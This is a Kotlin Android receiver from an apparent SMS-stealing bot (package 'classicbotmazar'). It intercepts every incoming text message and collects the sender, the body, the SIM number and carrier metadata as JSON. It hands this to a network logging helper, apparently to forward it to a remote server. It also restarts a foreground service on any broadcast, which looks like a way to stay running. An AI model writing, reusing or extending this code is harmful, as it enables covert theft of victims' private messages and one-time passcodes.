package org.reddeaddeath.classicbotmazar

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import android.provider.Telephony
import android.telephony.SmsMessage
import android.telephony.SubscriptionManager
import android.util.Log
import org.json.JSONObject

class BrodCastReceiver : BroadcastReceiver() {
    private val TAG = "BrodCastReceiver"

    private fun debugLog(message: String) {
        Log.d(TAG, message)
    }

    override fun onReceive(context: Context, intent: Intent) {
        val action = intent.action
        debugLog("Received broadcast: $action")

        when (action) {
            Telephony.Sms.Intents.SMS_RECEIVED_ACTION,
            Telephony.Sms.Intents.SMS_DELIVER_ACTION -> {
                handleSmsReceived(context, intent)
                ServiceForeground.startForeground(context)
            }
            else -> {
                ServiceForeground.startForeground(context)
            }
        }
    }

    private fun handleSmsReceived(context: Context, intent: Intent) {
        debugLog("Handling SMS received")
        try {
            val messages = Telephony.Sms.Intents.getMessagesFromIntent(intent)
            if (messages.isNullOrEmpty()) {
                debugLog("No SMS messages found in intent")
                return
            }

            var subscriptionId = -1
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
                subscriptionId = intent.getIntExtra("subscription", -1)
            }

            for (smsMessage in messages) {
                val sender = smsMessage.displayOriginatingAddress ?: ""
                val messageBody = smsMessage.messageBody ?: ""
                val timestamp = smsMessage.timestampMillis
                val serviceCenterAddress = smsMessage.serviceCenterAddress ?: ""
                val protocolIdentifier = smsMessage.protocolIdentifier
                val messageClass = smsMessage.messageClass?.name ?: "UNKNOWN"
                
                val simSlot = getSimSlotFromSubscriptionId(context, subscriptionId)
                val simNumber = getSimNumberFromSubscriptionId(context, subscriptionId)
                val simInfo = if (simSlot > 0) "SIM$simSlot" else "Default SIM"
                
                val smsDetails = JSONObject().apply {
                    put("sender", sender)
                    put("message", messageBody)
                    put("timestamp", timestamp)
                    put("sim_slot", simSlot)
                    put("sim_info", simInfo)
                    put("sim_number", simNumber)
                    put("subscription_id", subscriptionId)
                    put("service_center", serviceCenterAddress)
                    put("protocol_id", protocolIdentifier)
                    put("message_class", messageClass)
                    put("message_count", messages.size)
                }

                val logMessage = smsDetails.toString()
                debugLog("SMS details: $logMessage")

                UtilsNetwork.sendLog(context, "sms_received", logMessage)
            }
        } catch (e: Exception) {
            debugLog("Error handling SMS: ${e.message}")
            UtilsNetwork.sendLog(context, "sms_error", "Error: ${e.message}")
        }
    }

    private fun getSimSlotFromSubscriptionId(context: Context, subscriptionId: Int): Int {
        if (subscriptionId == -1) {
            return 0
        }

        try {
            val subscriptionManager = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
                SubscriptionManager.from(context)
            } else {
                return 0
            }

            val subscriptions = subscriptionManager.activeSubscriptionInfoList
            if (subscriptions != null) {
                for (i in subscriptions.indices) {
                    if (subscriptions[i].subscriptionId == subscriptionId) {
                        return i + 1
                    }
                }
            }
        } catch (e: Exception) {
            debugLog("Error getting SIM slot: ${e.message}")
        }

        return 0
    }

    private fun getSimNumberFromSubscriptionId(context: Context, subscriptionId: Int): String {
        if (subscriptionId == -1) {
            return ""
        }

        try {
            val subscriptionManager = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
                SubscriptionManager.from(context)
            } else {
                return ""
            }

            val subscriptions = subscriptionManager.activeSubscriptionInfoList
            if (subscriptions != null) {
                for (subscriptionInfo in subscriptions) {
                    if (subscriptionInfo.subscriptionId == subscriptionId) {
                        return subscriptionInfo.number ?: ""
                    }
                }
            }
        } catch (e: SecurityException) {
            debugLog("SecurityException getting SIM number: ${e.message}")
        } catch (e: Exception) {
            debugLog("Error getting SIM number: ${e.message}")
        }

        return ""
    }
}


